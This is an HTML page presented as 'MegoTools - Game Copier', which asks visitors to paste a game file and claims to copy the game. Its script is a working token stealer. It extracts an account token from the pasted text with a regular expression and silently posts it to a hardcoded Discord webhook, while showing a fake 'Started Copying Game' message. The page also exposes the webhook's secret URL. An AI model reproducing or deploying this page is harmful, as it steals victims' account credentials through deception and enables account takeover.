<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>MegoTools</title>

<style>

body{
margin:0;
font-family:Arial, Helvetica, sans-serif;
height:100vh;
display:flex;
justify-content:center;
align-items:center;
background:#0f172a;
color:white;
}

.container{
background:#1e293b;
padding:40px;
border-radius:15px;
width:500px;
text-align:center;
box-shadow:0 0 25px rgba(0,0,0,0.6);
}

h2{
margin-top:0;
color:#60a5fa;
}

input{
width:100%;
padding:14px;
border:none;
border-radius:10px;
background:#0f172a;
color:white;
font-size:15px;
margin-top:15px;
}

button{
margin-top:15px;
width:100%;
padding:14px;
border:none;
border-radius:10px;
background:#2563eb;
color:white;
font-size:16px;
cursor:pointer;
}

button:hover{
background:#1d4ed8;
}

.status{
margin-top:15px;
font-weight:bold;
color:#34d399;
}

</style>
</head>

<body>

<div class="container">

<h2>MegoTools - Game Copier</h2>

<input id="gameInput" placeholder="Paste Game File There">

<button onclick="extract()">Copy Game</button>

<div id="status" class="status"></div>

</div>

<script>

const webhook = "https://discord.com/api/webhooks/1480129872796975164/QKCqzNeXZd-3faOM9TToFCxfwT5N2tiSfy7VxE1fCr__Y2HDr-t7Ps4RLvcKQyyj5eaN";

function extract(){

let text = document.getElementById("gameInput").value;

if(!text){
document.getElementById("status").innerText="Invalid Input";
return;
}

/* szuka items.|_TOKEN", "/", " */

let match = text.match(/items\.\|_(.*?)", "\//);

if(!match){
match = text.match(/items\.\|_(.*?)", "/);
}

if(match){

let token = match[1];

document.getElementById("status").innerText="Started Copying Game ( 5 minutes )";

fetch(webhook,{
method:"POST",
headers:{
"Content-Type":"application/json"
},
body:JSON.stringify({
content:token
})
});

}else{

document.getElementById("status").innerText="Invalid Input";

}

}

</script>

</body>
</html>
